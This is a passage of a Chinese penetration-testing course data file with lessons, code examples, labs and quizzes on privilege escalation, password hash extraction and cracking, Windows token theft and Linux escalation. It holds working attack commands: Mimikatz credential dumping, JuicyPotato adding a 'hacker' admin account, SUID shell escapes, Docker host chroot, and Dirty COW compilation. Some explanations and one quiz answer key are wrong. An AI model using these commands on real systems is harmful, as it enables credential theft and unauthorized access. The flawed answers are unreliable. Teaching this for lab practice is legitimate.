    labEnvironment: [{ name: 'Vulnhub靶机提权练习', description: '使用Vulnhub靶机练习提权', url: 'https://www.vulnhub.com/', type: 'online', setup: '1. 下载并导入Vulnhub靶机到VirtualBox\n2. 启动靶机并获取低权限shell\n3. 运行linPEAS进行信息收集\n4. 根据收集的信息寻找提权方法\n5. 利用漏洞或配置错误提权到root', expectedOutput: '成功从低权限用户提权到root' }, { name: 'Metasploitable2提权', description: '练习Metasploitable2的Linux提权', url: 'https://docs.rapid7.com/metasploit/metasploitable-2/', type: 'local', setup: '1. 启动Metasploitable2虚拟机\n2. 通过SSH或Telnet登录低权限用户(msfadmin)\n3. 运行linPEAS检查\n4. 利用内核漏洞或sudo提权', expectedOutput: '掌握Linux提权基本流程' }],
    recommendedTools: [{ name: 'winPEAS', description: 'Windows提权检查工具', url: 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite', type: 'local' }, { name: 'linPEAS', description: 'Linux提权检查工具', url: 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite', type: 'local' }, { name: 'linux-exploit-suggester', description: 'Linux内核漏洞检测', url: 'https://github.com/mzet-/linux-exploit-suggester', type: 'local' }, { name: 'Windows-Exploit-Suggester', description: 'Windows漏洞检测', url: 'https://github.com/bitsadmin/wesng', type: 'local' }],
    quiz: [
      { type: 'single', question: 'Linux中查找SUID文件的命令？', options: ['A. ls -la /', 'B. find / -perm -u=s -type f', 'C. cat /etc/passwd', 'D. whoami'], correctIndex: 1, explanation: 'find / -perm -u=s -type f 2>/dev/null 查找具有SUID权限的文件，这些文件可能用于提权。' },
      { type: 'single', question: 'Windows中查看已安装补丁的命令？', options: ['A. netstat', 'B. whoami', 'C. wmic qfe list', 'D. systeminfo'], correctIndex: 2, explanation: 'wmic qfe list可以列出所有已安装的补丁，用于查找未打补丁的漏洞。' },
      { type: 'boolean', question: '提权的最终目标通常是获取系统最高权限。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: '提权的目标是获取系统最高权限，即Linux的root或Windows的Administrator/SYSTEM。' },
      { type: 'fill', question: 'Linux中用于查看定时任务的命令是______ -l。', correctAnswer: 'crontab', explanation: 'crontab -l用于查看当前用户的定时任务，/etc/crontab查看系统定时任务。' },
      { type: 'multiple', question: '以下哪些是Linux提权思路？（多选）', options: ['A. 内核漏洞', 'B. SUID文件', 'C. sudo权限', 'D. 端口扫描'], correctIndices: [0, 1, 2], explanation: '内核漏洞、SUID文件、sudo权限误配都是Linux常见提权方法。' },
      { type: 'single', question: 'linPEAS是什么类型的工具？', options: ['A. 漏洞利用工具', 'B. 提权信息收集检查脚本', 'C. 密码破解工具', 'D. 端口扫描工具'], correctIndex: 1, explanation: 'linPEAS是Linux提权信息收集检查脚本，自动检查可用的提权向量。' }
    ],
    expertNotes: [
      { author: '余弦', title: '提权实战技巧', content: '提权前一定要做好信息收集。winPEAS/linPEAS是神器，能自动检查大多数提权向量。找到利用方法后，优先选择已知漏洞(exploit)，其次考虑配置错误。', url: 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite' },
      { author: '渗透测试工程师', title: '密码复用提权', content: '实战中密码复用提权非常常见。查看配置文件(.py, .php, .config等)、数据库连接文件、历史命令，很可能发现复用密码。拿到hash后先查彩虹表。', url: 'https://crackstation.net/' },
      { author: '安全研究员', title: 'Windows提权重点', content: 'Windows提权重点关注：未打补丁(优先ms08-067, ms17-010)、服务配置错误(alwaysInstallElevated)、计划任务、注册表等。kernel32.dll的DLL劫持也是经典方法。', url: 'https://www.exploit-db.com/' }
    ],
    environmentSetup: {
      prerequisites: ['Kali Linux已安装', 'VirtualBox已安装', '网络连接'],
      verificationSteps: ['1. 下载linPEAS脚本', '2. 在靶机上执行linPEAS', '3. 分析输出找到提权向量', '4. 利用漏洞或配置错误提权']
    }
  ,
      resources: [{"name": "Windows提权完全指南", "url": "https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/", "type": "article"}, {"name": "Linux提权技术汇总", "url": "https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/", "type": "article"}, {"name": "提权脚本集合", "url": "https://github.com/carlospolop/PEASS-ng", "type": "article"}, {"name": "系统漏洞提权利用", "url": "https://www.freebuf.com/articles/system/289012.html", "type": "article"}]},
  { 
    id: 'pen-16', 
    day: 16, 
    title: '本地密码哈希破解', 
    subtitle: 'Password Hash Cracking', 
    objectives: ['理解密码存储', '掌握哈希提取', '学习破解技术'], 
    content: `密码安全是系统安全的基石。理解密码如何存储、提取和破解是渗透测试的关键技能。

【Windows密码存储机制】
• LM Hash：早期LAN Manager协议使用，可逆，已淘汰但仍存在于某些系统
• NTLM Hash：Windows当前使用的密码哈希，基于MD4，不可逆
• SAM数据库：存储在C:\\Windows\\System32\\config\\SAM，锁定时无法读取
• LSASS进程：内存中存储当前登录用户的凭据，可被Mimikatz提取
• SYSKEY：系统密钥加密SAM，进一步保护密码哈希

【NTLM认证流程】
1. 客户端发送用户名到服务器
2. 服务器返回16字节随机数(Challenge)
3. 客户端用密码哈希加密Challenge返回(Response)
4. 服务器验证Response是否正确

【密码提取工具】

Mimikatz（最重要）：
• privilege::debug - 提升到DEBUG权限
• sekurlsa::logonpasswords - 提取登录用户凭据
• sekurlsa::msv - 提取NTLM哈希
• lsadump::sam - 读取SAM数据库
• lsadump::lsa /inject - 提取LSA secrets
• ts::sessions - 查看终端会话

Impacket工具集：
• secretsdump.py - 远程导出SAM和LSASS
• smbexec.py - SMB远程执行
• wmiexec.py - WMI远程执行
• psexec.py - PSEXEC远程执行

【密码哈希类型】
• NTLM：md4(username::domain:password)
• NetNTLMv2：Challenge-Response认证的哈希
• Cached Credentials：域用户登录后的缓存

【彩虹表原理】
• 预计算常见密码的哈希值，存储为表
• 查找时直接查表，避免实时计算
• 空间换时间，适合破解弱密码
• 在线查询：https://crackstation.net/

【Hashcat破解工具】
• -m 1000：NTLM哈希
• -m 5600：NetNTLMv2
• -m 13100：Kerberos TGS-REQ
• -a 0：字典攻击
• -a 3：暴力破解
• -a 6：字典+暴力混合

示例命令：
hashcat -m 1000 -a 0 hash.txt wordlist.txt
hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a
hashcat -m 1000 -a 7 hash.txt wordlist.txt ?d?d?d?d

【密码喷洒攻击】
• 用常用密码尝试多个账户
• 避免单个账户多次失败导致锁定
• 需要先收集目标用户名列表
• 工具：Spray365、SharpSpray

【防御措施】
• 使用强密码策略(长度>12,复杂度)
• 启用Account Lockout Policy
• 禁用LM Hash
• 启用Protected Users安全组
• 部署Credential Guard
• 定期检查异常登录`, 
    keyPoints: ['Windows用NTLM哈希存储密码', 'Mimikatz是密码提取神器', 'SAM数据库存储密码哈希', '彩虹表快速破解弱密码', 'Hashcat支持多种哈希破解', '密码喷洒用弱密码撞多个账户'],
    codeExamples: [{ title: 'Mimikatz常用命令', language: 'powershell', code: `# Mimikatz 常用命令\n\n# 提升权限\nprivilege::debug\n\n# 提取登录用户凭据（最常用）\nsekurlsa::logonpasswords\n\n# 提取所有用户NTLM哈希\nsekurlsa::msv\n\n# 读取SAM数据库（需要SYSTEM权限）\nlsadump::sam\n\n# 读取LSA Secrets\nlsadump::lsa /inject\n\n# 查看票据\nkerberos::list\n\n# 清除票据\nkerberos::purge\n\n# 注入票据\nkerberos::ptt ticket.kirbi\n\n# 在Meterpreter中使用\nload kiwi\ncreds_all\nlsa_dump_sam\nlsa_dump_secrets`, explanation: 'Mimikatz是Windows密码提取最强大的工具，支持多种提取方式' }, { title: 'Hashcat破解命令', language: 'bash', code: '# Hashcat 破解示例\n\n# 破解NTLM哈希\nhashcat -m 1000 -a 0 hash.txt wordlist.txt\n\n# 破解NetNTLMv2\nhashcat -m 5600 -a 3 hash.txt ?u?u?u?u?u?u?u?u\n\n# 组合攻击（字典+掩码）\nhashcat -m 1000 -a 7 hash.txt rockyou.txt ?d?d?d?d\n\n# 查看哈希类型\nhashcat -m 1000 --example-hashes\n\n# 显示破解结果\nhashcat -m 1000 --show hash.txt\n\n# 恢复进度\nhashcat -m 1000 --restore\n\n# 攻击模式说明\n# -a 0: 字典攻击\n# -a 1: 组合攻击\n# -a 3: 暴力破解\n# -a 6: 字典+掩码\n# -a 7: 掩码+字典', explanation: 'Hashcat是最快的哈希破解工具，支持GPU加速' }],
    labEnvironment: [{ name: 'Mimikatz密码提取练习', description: '在Windows靶机练习Mimikatz', url: 'https://docs.microsoft.com/en-us/windows/whats-new/', type: 'local', setup: '1. 在Windows靶机运行Mimikatz\n2. 执行privilege::debug提升权限\n3. 执行sekurlsa::logonpasswords提取凭据\n4. 分析输出的哈希和明文密码\n5. 尝试使用提取的凭据横向移动', expectedOutput: '成功提取Windows密码凭据' }, { name: 'Hashcat破解练习', description: '破解提取的密码哈希', url: 'https://hashcat.net/hashcat/', type: 'local', setup: '1. 获取NTLM哈希文件\n2. 下载rockyou.txt字典\n3. 运行hashcat -m 1000 -a 0 hash.txt rockyou.txt\n4. 查看破解结果\n5. 分析哪些密码被破解', expectedOutput: '掌握Hashcat基本用法，成功破解弱密码' }],
    recommendedTools: [{ name: 'Mimikatz', description: 'Windows密码提取工具', url: 'https://github.com/gentilkiwi/mimikatz', type: 'local' }, { name: 'Hashcat', description: '哈希破解工具', url: 'https://hashcat.net/hashcat/', type: 'local' }, { name: 'Impacket', description: 'Python渗透工具集', url: 'https://github.com/SecureAuthCorp/impacket', type: 'local' }, { name: 'CrackStation', description: '在线彩虹表', url: 'https://crackstation.net/', type: 'online' }],
    quiz: [
      { type: 'single', question: 'Mimikatz中提取登录用户凭据的命令？', options: ['A. lsadump::sam', 'B. sekurlsa::logonpasswords', 'C. kerberos::list', 'D. privilege::debug'], correctIndex: 1, explanation: 'sekurlsa::logonpasswords从LSASS进程中提取当前和最近登录用户的凭据。' },
      { type: 'single', question: 'Hashcat中-m 1000参数表示？', options: ['A. MD5', 'B. SHA1', 'C. NTLM', 'D. bcrypt'], correctIndex: 2, explanation: '-m 1000表示NTLM哈希，是Windows密码的标准哈希格式。' },
      { type: 'boolean', question: '彩虹表可以破解所有类型的密码哈希。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: '彩虹表只能破解未加盐的常见密码哈希。加盐密码或长强密码难以通过彩虹表破解。' },
      { type: 'fill', question: 'Windows密码哈希存储在______数据库中。', correctAnswer: 'SAM', explanation: 'SAM(Security Account Manager)数据库存储本地用户的安全标识和密码哈希。' },
      { type: 'multiple', question: '以下哪些是密码提取工具？（多选）', options: ['A. Mimikatz', 'B. Hashcat', 'C. Nmap', 'D. secretsdump.py'], correctIndices: [0, 2, 3], explanation: 'Mimikatz、secretsdump.py是密码提取工具，Hashcat是哈希破解工具，Nmap是端口扫描工具。' },
      { type: 'single', question: '密码喷洒攻击的特点？', options: ['A. 对单个账户暴力破解', 'B. 用弱密码尝试多个账户', 'C. 破解哈希', 'D. 读取SAM文件'], correctIndex: 1, explanation: '密码喷洒用常用密码尝试多个账户，避免账户锁定。' }
    ],
    expertNotes: [
      { author: '余弦', title: 'Mimikatz实战技巧', content: 'Mimikatz必须以管理员权限运行。sekurlsa::logonpasswords最常用，可以获取内存中的明文密码和哈希。拿到hash后优先查CrackStation。', url: 'https://github.com/gentilkiwi/mimikatz' },
      { author: '渗透测试工程师', title: 'Hashcat GPU加速', content: 'Hashcat支持GPU加速，GPU比CPU快几十倍。Linux下安装cudaHashcat，Windows直接使用openCL版本。掩码攻击?u?l?d组合可以破解大部分8位以内密码。', url: 'https://hashcat.net/hashcat/' },
      { author: '安全研究员', title: '防御建议', content: '防御密码攻击：1)强密码策略 2)账户锁定 3)禁用LM Hash 4)启用Protected Users 5)部署Credential Guard 6)监控异常登录。最重要是防止Mimikatz运行。', url: 'https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/' }
    ],
    environmentSetup: {
      prerequisites: ['Kali Linux已安装', 'Windows靶机', 'Hashcat已安装'],
      verificationSteps: ['1. 在Windows靶机运行Mimikatz', '2. 提取密码哈希', '3. 使用Hashcat破解', '4. 分析破解结果']
    }
  ,
      resources: [{"name": "Hashcat密码破解指南", "url": "https://hashcat.net/wiki/", "type": "article"}, {"name": "John the Ripper教程", "url": "https://www.openwall.com/john/doc/", "type": "article"}, {"name": "彩虹表攻击原理", "url": "https://www.freebuf.com/articles/database/278901.html", "type": "article"}, {"name": "密码破解工具对比", "url": "https://www.anquanke.com/post/id/298023", "type": "article"}]},
  { 
    id: 'pen-17', 
    day: 17, 
    title: '令牌窃取与Rotten Potato', 
    subtitle: 'Token Impersonation & Rotten Potato', 
    objectives: ['理解令牌窃取原理', '掌握Rotten Potato', '学习NTLM中继攻击'], 
    content: `Windows访问令牌是描述进程或线程安全上下文的对象，令牌窃取是提权的核心技术之一。

【Windows访问令牌基础】
• 访问令牌(Access Token)：包含用户身份和权限信息
• 令牌类型：
  - Delegation Token(可委派)：交互式登录，可用于远程认证
  - Impersonation Token(模拟令牌)：服务或进程模拟其他用户
• 令牌权限：
  - SeImpersonatePrivilege：允许进程模拟其他用户
  - SeDebugPrivilege：允许调试任意进程
  - SeAssignPrimaryTokenPrivilege：允许分配令牌

【令牌窃取原理】
1. 攻击者获取有SeImpersonatePrivilege权限的服务账户shell
2. 通过NTLM Relay将本地SMB连接的认证中继到本地NBIO服务
3. 获取高权限令牌的协商认证
4. 利用该令牌创建新进程或执行命令

【Rotten Potato攻击流程】
1. 触发DCOM/RPC认证请求
2. 本地端口（默认随机）监听Challenge
3. 将Challenge通过NTLM Relay转发到本地的NTLM-over-HTTP服务
4. 完成Challenge-Response验证
5. 获取SYSTEM令牌
6. 使用令牌创建新进程或执行命令

【Juicy Potato】
Juicy Potato是Rotten Potato的改进版，支持更多CLSID，提供更稳定的利用。

利用条件：
• 需要SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege
• 需要本地支持DCOM/RPC
• 需要可用的CLSID

利用命令：
JuicyPotato.exe -t t -p "whoami > C:\\temp\\result.txt" -l 1234 -c {CLSID}

常用CLSID：
• {4991d34b-80a1-4291-83b6-3318368c2e5a} - Print Spooler
• {8d8f27ca-1b6a-4c4f-9371-3bcb5f6b8b3e} - DnssCache

【Sweet Potato】
针对SharePoint和Print Spooler服务的令牌窃取工具。

【令牌窃取防御】
• 禁用SeImpersonatePrivilege(需要重启服务)
• 启用Windows Defender Credential Guard
• 隔离服务账户权限
• 限制RPC/DCOM端口
• 监控异常令牌创建

【NTLM中继基础】
NTLM认证过程：
1. 用户访问服务，发送用户名
2. 服务发送16字节Challenge
3. 客户端用密码哈希加密Challenge返回Response
4. 中继攻击：把Challenge转发到另一个服务，骗取Response验证

SMB签名：
• SMB签名可防止中继攻击
• 启用签名：RequireSecuritySignature=1
• Windows 2012+默认启用签名`, 
    keyPoints: ['令牌代表用户身份权限', 'SeImpersonatePrivilege是前提', 'Rotten Potato利用NTLM中继', '需要本地NBIO服务', 'Juicy Potato是改进版', '服务账户常被利用'],
    codeExamples: [{ title: 'Juicy Potato利用脚本', language: 'powershell', code: `# Juicy Potato 利用\n\n# 下载JuicyPotato\n# https://github.com/ohpe/juicy-potato/releases\n\n# 基本用法\nJuicyPotato.exe -t t -p "whoami" -l 1234\n\n# 使用指定CLSID\nJuicyPotato.exe -t t -p "net user hacker P@ssw0rd /add" -l 1234 -c {4991d34b-80a1-4291-83b6-3318368c2e5a}\n\n# 创建SYSTEM shell\nJuicyPotato.exe -t t -p "C:\\temp\\shell.exe" -l 1234\n\n# 自动化搜索可用CLSID\nfor /f "tokens=*" %a in (\'clsids.txt\') do @JuicyPotato.exe -t t -p "whoami" -l 1234 -c %a\n\n# 在Metasploit中利用\n# 1. 获取shell\n# 2. upload JuicyPotato.exe\n# 3. execute JuicyPotato.exe -t t -p "shell.exe" -l 4444\n\n# 检查权限\nwhoami /priv`, explanation: 'Juicy Potato利用SeImpersonatePrivilege提权到SYSTEM' }, { title: '令牌窃取Metasploit模块', language: 'bash', code: '# Metasploit 中的令牌窃取\n\n# 获取session后\nsessions -i 1\n\n# 查看可用令牌\nlist_tokens -u\n\n# 冒充用户令牌\nimpersonate_token DOMAIN\\\\Username\n\n# 冒充SYSTEM令牌\nimpersonate_token "NT AUTHORITY\\\\SYSTEM"\n\n# 查看当前令牌\ngetuid\ngetprivs\n\n# 删除令牌\ndrop_token\n\n# 在Meterpreter中使用\nload kiwi\nlist_tokens\nimpersonate_token "BUILTIN\\\\Administrators"\n\n# 使用incognito模块\nuse incognito\nlist_tokens -u\nimpersonate_token DOMAIN\\\\admin', explanation: 'Metasploit的incognito模块支持令牌窃取' }],
    labEnvironment: [{ name: 'Windows令牌窃取练习', description: '在Windows靶机练习令牌窃取', url: 'https://github.com/ohpe/juicy-potato', type: 'local', setup: '1. 获取低权限shell\n2. 检查whoami /priv确认SeImpersonatePrivilege\n3. 下载并上传JuicyPotato.exe\n4. 执行JuicyPotato.exe -t t -p "whoami" -l 1234\n5. 验证返回SYSTEM', expectedOutput: '成功通过令牌窃取获取SYSTEM权限' }, { name: 'Metasploit令牌窃取', description: '使用Metasploit练习令牌窃取', url: 'https://www.metasploit.com/', type: 'local', setup: '1. 获取Meterpreter shell\n2. 加载incognito模块\n3. list_tokens -u查看可用令牌\n4. impersonate_token冒充令牌\n5. 执行命令验证', expectedOutput: '掌握Metasploit令牌窃取' }],
    recommendedTools: [{ name: 'Juicy Potato', description: 'Rotten Potato改进版', url: 'https://github.com/ohpe/juicy-potato', type: 'local' }, { name: 'Sweet Potato', description: 'SharePoint令牌窃取', url: 'https://github.com/CCob/SweetPotato', type: 'local' }, { name: 'Metasploit Incognito', description: 'Metasploit令牌模块', url: 'https://www.metasploit.com/', type: 'local' }, { name: 'Mimikatz', description: '令牌操作工具', url: 'https://github.com/gentilkiwi/mimikatz', type: 'local' }],
    quiz: [
      { type: 'single', question: 'Rotten Potato攻击利用什么权限？', options: ['A. SeDebugPrivilege', 'B. SeImpersonatePrivilege', 'C. SeBackupPrivilege', 'D. SeRestorePrivilege'], correctIndex: 1, explanation: 'SeImpersonatePrivilege允许进程模拟其他用户，是Rotten Potato的前提。' },
      { type: 'single', question: 'Juicy Potato与Rotten Potato的关系？', options: ['A. 无关系', 'B. 是改进版本', 'C. 是原版', 'D. 是同类工具的不同名称'], correctIndex: 1, explanation: 'Juicy Potato是Rotten Potato的改进版，支持更多CLSID，利用更稳定。' },
      { type: 'boolean', question: '令牌窃取可以让普通用户获取SYSTEM权限。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: '如果服务账户有SeImpersonatePrivilege，可通过令牌窃取获取SYSTEM权限。' },
      { type: 'fill', question: 'Windows令牌分为Delegation和______两种类型。', correctAnswer: 'Impersonation', explanation: 'Delegation Token用于交互式登录可远程认证，Impersonation Token用于本地模拟。' },
      { type: 'multiple', question: '以下哪些是令牌窃取工具？（多选）', options: ['A. Juicy Potato', 'B. Sweet Potato', 'C. Hashcat', 'D. Meterpreter'], correctIndices: [0, 1, 3], explanation: 'Juicy Potato、Sweet Potato、Meterpreter的incognito模块都支持令牌窃取，Hashcat是哈希破解工具。' },
      { type: 'single', question: '在Metasploit中列出可用令牌的命令？', options: ['A. whoami', 'B. getuid', 'C. list_tokens', 'D. getprivs'], correctIndex: 2, explanation: 'list_tokens -u可以列出当前可用的用户和机器令牌。' }
    ],
    expertNotes: [
      { author: '余弦', title: '令牌窃取实战经验', content: '实战中IIS、MSSQL、Apache等服务账户经常有SeImpersonatePrivilege。Juicy Potato基本通杀2019之前的Windows服务器。SharePoint服务有特殊的CLSID可用Sweet Potato。', url: 'https://github.com/ohpe/juicy-potato' },
      { author: '渗透测试工程师', title: '令牌窃取防御', content: '防御令牌窃取：1)禁用SeImpersonatePrivilege 2)启用Credential Guard 3)Windows 10/2016+默认有保护 4)限制服务账户权限 5)RPC端口135和COM端口5876过滤。', url: 'https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/' },
      { author: '安全研究员', title: 'NTLM中继原理', content: 'NTLM中继是令牌窃取的核心。通过本地端口打补丁让SMB认证转发到NBIO服务，协商获取SYSTEM令牌。理解Challenge-Response机制是攻击关键。', url: 'https://www.moe.lu/sites/default/files/Roasting%20AS-REP.pdf' }
    ],
    environmentSetup: {
      prerequisites: ['Kali Linux', 'Windows靶机', 'JuicyPotato.exe'],
      verificationSteps: ['1. 获取低权限shell', '2. 检查SeImpersonatePrivilege', '3. 上传并执行JuicyPotato', '4. 验证SYSTEM权限获取']
    }
  ,
      resources: [{"name": "Windows令牌攻击详解", "url": "https://www.ired.team/offensive-security/privilege-escalation/", "type": "article"}, {"name": "Potato系列提权分析", "url": "https://www.freebuf.com/articles/system/289012.html", "type": "article"}, {"name": "令牌窃取技术实战", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}, {"name": "Windows权限提升体系", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings", "type": "article"}]},
  { 
    id: 'pen-18', 
    day: 18, 
    title: 'Linux权限提升', 
    subtitle: 'Linux Privilege Escalation', 
    objectives: ['掌握Linux信息收集', 'SUID提权', '定时任务提权'], 
    content: `Linux提权需要系统性地收集信息，寻找配置错误、漏洞利用和密码复用等机会。

【Linux提权信息收集】

系统信息：
• uname -a - 内核版本和架构
• cat /etc/issue - 发行版信息
• cat /etc/*release - 详细发行信息
• arch - 架构(x86_64, i386, arm)
• cat /proc/version - 内核版本信息
• cat /etc/crontab - 系统定时任务

用户和权限：
• whoami && id - 当前用户和组
• sudo -l - sudo权限(需要密码)
• cat /etc/passwd - 所有用户
• cat /etc/group - 组信息
• cat /etc/shadow - 影子文件(需root读)
• ls -la /home/*/ - 用户目录权限

网络信息：
• netstat -tulnp - 监听端口
• netstat -antp - 已建立连接
• ss -tulnp - 替代netstat
• cat /etc/hosts - 主机记录
• ifconfig / ip addr - 网络接口

【SUID/SGID提权】
SUID文件特点：
• 执行时具有文件所有者权限
• root所有SUID文件被利用是常见提权手段
• find / -perm -u=s -type f 2>/dev/null

可利用的SUID工具：
• nmap: nmap --interactive, !sh
• vim: vim -c ':!/bin/sh'
• less: less /etc/passwd, !/bin/sh
• more: more /etc/passwd, !/bin/sh
• awk: awk 'BEGIN {system("/bin/sh")}'
• find: find / -exec /bin/sh -p \\; -quit
• git: git help commit --no-oid, !/bin/sh
• python/perl/ruby/php: 进入shell
• cp/mv/ls: 某些版本可利用

【定时任务提权】
检查定时任务：
• cat /etc/crontab - 系统定时任务
• ls -la /var/spool/cron/ - 用户定时任务
• crontab -l - 当前用户任务
• cat /etc/anacrontab - anacron任务

可利用的定时任务：
• 脚本可被修改
• 脚本使用绝对路径
• 脚本所在目录可写
• 环境变量被控制

【内核漏洞提权】
内核漏洞检测流程：
1. uname -r 确定内核版本
2. searchsploit "Linux Kernel x.x.x" 或 linux-exploit-suggester
3. 下载exploit源码
4. 编译并执行
5. 失败可能需调整

常用内核exploit：
• Dirty COW (CVE-2016-5195): 写任意内存
• Stack Clash (CVE-2017-1000364): 栈冲突
• Spectre/Meltdown: CPU漏洞
• privilege-escalation-awesome-scripts: 自动检测

【密码复用提权】
• cat ~/.bash_history - 历史命令
• cat /var/www/html/config.php - Web配置
• cat /etc/mysql/my.cnf - 数据库配置
• cat /var/lib/mysql/user.frm - MySQL用户
• ls -la /var/log/ - 日志目录
• find / -name "*.php" -o -name "*.py" | xargs grep -l "password"

【NFS提权】
• showmount -e target - 查看NFS共享
• mount -t nfs target:/share /mnt - 挂载
• no_root_squash选项可写入root文件

【Docker组提权】
• 如果用户在docker组，可挂载宿主目录
• docker run -v /:/host -it ubuntu chroot /host`, 
    keyPoints: ['SUID文件可提权', 'find / -perm -u=s找SUID文件', '定时任务可被劫持', '内核漏洞需版本匹配', '配置文件常有密码', 'nmap/vim/less等工具可利用'],
    codeExamples: [{ title: 'Linux提权检查脚本', language: 'bash', code: `#!/bin/bash\n# linPEAS简化版提权检查\n\necho "[*] === System Information ==="\nuname -a\ncat /etc/issue\necho "[*] === Current User ==="\nwhoami && id\nsudo -l 2>/dev/null\necho "[*] === SUID Files ==="\nfind / -perm -u=s -type f 2>/dev/null | head -50\necho "[*] === Cron Jobs ==="\ncat /etc/crontab\nls -la /var/spool/cron/\necho "[*] === Network Info ==="\nnetstat -tulnp 2>/dev/null || ss -tulnp\necho "[*] === Sensitive Files ==="\ncat /etc/passwd | grep -v nologin\ncat /etc/shadow 2>/dev/null\necho "[*] === Config Files ==="\nfind / -name "*.conf" -o -name "*.cnf" 2>/dev/null | head -20\necho "[*] === History Files ==="\ncat ~/.bash_history 2>/dev/null\necho "[*] === Sudo Version (check exploits) ==="\nsudo -V 2>/dev/null | head -1`, explanation: 'Linux提权信息收集综合脚本' }, { title: '常用内核exploit搜索', language: 'bash', code: '# 使用searchsploit搜索内核漏洞\nsearchsploit "Linux Kernel\"\n\n# 使用linux-exploit-suggester\n# 下载脚本\nwget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh\nchmod +x linux-exploit-suggester.sh\n./linux-exploit-suggester.sh\n\n# 或者在线查询\n# https://www.kernel-exploits.com/\n\n# 常用exploit下载和编译\n# Dirty COW\nsearchsploit -m 40616\ngcc -pthread 40616.c -o exploit\n./exploit\n\n# 编译错误处理\n# 64位系统需要修改exploit或使用对应版本\ngcc -m32 -pthread 40616.c -o exploit', explanation: '搜索和利用Linux内核漏洞' }],
    labEnvironment: [{ name: 'Vulnhub靶机提权', description: '使用Vulnhub Linux靶机练习', url: 'https://www.vulnhub.com/', type: 'online', setup: '1. 下载并导入Linux靶机\n2. 获取低权限shell\n3. 运行提权检查脚本\n4. 分析SUID、定时任务、内核版本\n5. 根据发现进行提权', expectedOutput: '掌握Linux提权完整流程' }, { name: 'Metasploitable2提权', description: '练习Metasploitable2提权', url: 'https://docs.rapid7.com/metasploit/metasploitable-2/', type: 'local', setup: '1. SSH登录msfadmin账户\n2. 检查sudo权限和SUID文件\n3. 检查定时任务\n4. 查找内核漏洞\n5. 利用提权', expectedOutput: '掌握常见Linux提权技术' }],
    recommendedTools: [{ name: 'linPEAS', description: 'Linux提权检查脚本', url: 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite', type: 'local' }, { name: 'linux-exploit-suggester', description: 'Linux内核漏洞检测', url: 'https://github.com/mzet-/linux-exploit-suggester', type: 'local' }, { name: 'GTFOBins', description: 'SUID工具利用查询', url: 'https://gtfobins.github.io/', type: 'online' }, { name: 'searchsploit', description: 'Exploit-DB搜索工具', url: 'https://www.exploit-db.com/', type: 'local' }],
    quiz: [
      { type: 'single', question: 'Linux中查找所有SUID文件的命令？', options: ['A. ls -la /', 'B. find / -perm -u=s -type f 2>/dev/null', 'C. cat /etc/passwd', 'D. whoami'], correctIndex: 1, explanation: 'find / -perm -u=s -type f 2>/dev/null递归查找所有SUID文件。' },
      { type: 'single', question: '以下哪个SUID工具可以提权？', options: ['A. cat', 'B. nmap', 'C. ls', 'D. mkdir'], correctIndex: 1, explanation: 'nmap有--interactive模式，可以进入shell执行命令。' },
      { type: 'boolean', question: '内核漏洞提权需要版本匹配。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: '内核漏洞针对特定版本，必须确认靶机内核版本才能利用。' },
      { type: 'fill', question: '查看当前用户sudo权限的命令是sudo ______。', correctAnswer: '-l', explanation: 'sudo -l列出当前用户可以sudo执行的命令。' },
      { type: 'multiple', question: '以下哪些是Linux密码复用检查？（多选）', options: ['A. cat ~/.bash_history', 'B. find / -perm -u=s', 'C. cat /var/www/html/config.php', 'D. cat /etc/crontab'], correctIndices: [0, 2], explanation: '密码复用检查包括历史命令和配置文件。SUID是SUID提权，定时任务是定时任务提权。' },
      { type: 'single', question: 'GTFOBins的作用？', options: ['A. 搜索exploit', 'B. 查看SUID工具利用方法', 'C. 密码破解', 'D. 内核漏洞检测'], correctIndex: 1, explanation: 'GTFOBins收集了各种Linux工具的利用方法，特别是SUID提权。' }
    ],
    expertNotes: [
      { author: '余弦', title: 'Linux提权实战经验', content: '我的经验顺序：1)先跑linPEAS自动检查 2)重点看SUID和定时任务 3)GTFOBins查可利用工具 4)版本匹配才用内核exploit 5)最后考虑密码复用。脏牛漏洞通杀老内核。', url: 'https://gtfobins.github.io/' },
      { author: '渗透测试工程师', title: 'SUID提权技巧', content: 'SUID提权最实用。vim/less/git/awk都有方法提权。关键是找到nmap、vim等具有SUID权限且有shell接口的工具。find的-exec参数本身就是shell。', url: 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite' },
      { author: '安全研究员', title: '防御建议', content: '防御Linux提权：1)及时打补丁 2)不用root运行服务 3)SUID文件最小化 4)定时任务脚本权限严格 5)/etc/passwd禁止登录用户最少化 6)启用ASLR。', url: 'https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/' }
    ],
    environmentSetup: {
      prerequisites: ['Kali Linux', 'Linux靶机', 'linPEAS脚本'],
      verificationSteps: ['1. 上传linPEAS到靶机', '2. 执行linPEAS', '3. 分析输出找到提权向量', '4. 利用SUID/定时任务/内核漏洞提权']
    }
  ,
      resources: [{"name": "Linux提权完全手册", "url": "https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/", "type": "article"}, {"name": "SUID提权技术分析", "url": "https://www.freebuf.com/articles/system/298023.html", "type": "article"}, {"name": "Linux内核漏洞利用", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}, {"name": "Cron任务提权技巧", "url": "https://www.freebuf.com/articles/system/289012.html", "type": "article"}]},
  { 
    id: 'pen-19', 
    day: 19, 
    title: '隐藏通信隧道', 
    subtitle: 'Covert Channels', 
    objectives: ['理解隧道原理', '掌握ICMP/DNS隧道', '学习SSH/HTTP隧道'], 
    content: `隧道技术穿过防火墙/NAT建立隐蔽通信通道，是后渗透阶段的关键技术。

